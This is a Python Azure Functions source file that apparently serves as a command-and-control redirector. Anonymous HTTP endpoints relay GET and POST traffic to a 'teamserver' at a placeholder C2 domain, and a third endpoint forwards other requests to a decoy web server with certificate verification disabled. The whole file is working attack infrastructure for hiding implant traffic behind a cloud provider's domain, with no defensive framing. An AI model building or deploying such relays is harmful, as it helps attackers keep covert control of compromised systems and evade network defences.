import os
import ssl
import urllib.parse
import urllib.request
import azure.functions as func

app = func.FunctionApp()

TEAMSERVER_GET_URL = os.environ.get(
    "TEAMSERVER_GET_URL", "https://your-c2-domain.com/api/get"
)
TEAMSERVER_POST_URL = os.environ.get(
    "TEAMSERVER_POST_URL", "https://your-c2-domain.com/api/post"
)
WEB_SERVER_URL = os.environ.get("WEB_SERVER_URL", "http://example.com")


@app.route(route="get", auth_level=func.AuthLevel.ANONYMOUS)
def get_teamserver(req: func.HttpRequest) -> func.HttpResponse:
    """
    GET request proxy to an external teamserver URL.
    """
    headers = dict(req.headers)
    request = urllib.request.Request(TEAMSERVER_GET_URL, headers=headers)

    with urllib.request.urlopen(request) as response:
        content = response.read()
    return func.HttpResponse(content)


@app.route(route="post", auth_level=func.AuthLevel.ANONYMOUS)
def post_teamserver(req: func.HttpRequest) -> func.HttpResponse:
    """
    POST request proxy to an external teamserver URL.
    """
    headers = dict(req.headers)

    data = req.get_body()

    request = urllib.request.Request(
        TEAMSERVER_POST_URL, data=data, headers=headers, method="POST"
    )

    with urllib.request.urlopen(request) as response:
        content = response.read()
    return func.HttpResponse(content)


@app.route(route="web", auth_level=func.AuthLevel.ANONYMOUS)
def web_server(req: func.HttpRequest) -> func.HttpResponse:
    """
    Forwards requests (including headers, body, and query parameters) to a remote web server,
    returning the response, status code, and filtered headers to the caller.
    """
    headers = {k: v for k, v in req.headers.items() if k.lower() != "host"}

    client_ip = (
        req.headers.get("X-Forwarded-For")
        or req.headers.get("X-Client-IP")
        or req.headers.get("X-Real-IP")
    )
    if client_ip:
        headers["X-Forwarded-For"] = client_ip

    context = ssl._create_unverified_context()
    body = req.get_body()

    target_url = WEB_SERVER_URL
    url_params = urllib.parse.urlencode(req.params)
    if url_params:
        target_url += "?" + url_params

    request = urllib.request.Request(
        url=target_url,
        data=body if req.method.upper() != "GET" else None,
        headers=headers,
        method=req.method,
    )

    with urllib.request.urlopen(request, context=context) as response:
        response_body = response.read()
        response_headers = dict(response.getheaders())
        status_code = response.getcode()

    filtered_headers = {
        k: v
        for k, v in response_headers.items()
        if k.lower() not in ["transfer-encoding"]
    }

    return func.HttpResponse(
        body=response_body, status_code=status_code, headers=filtered_headers
    )
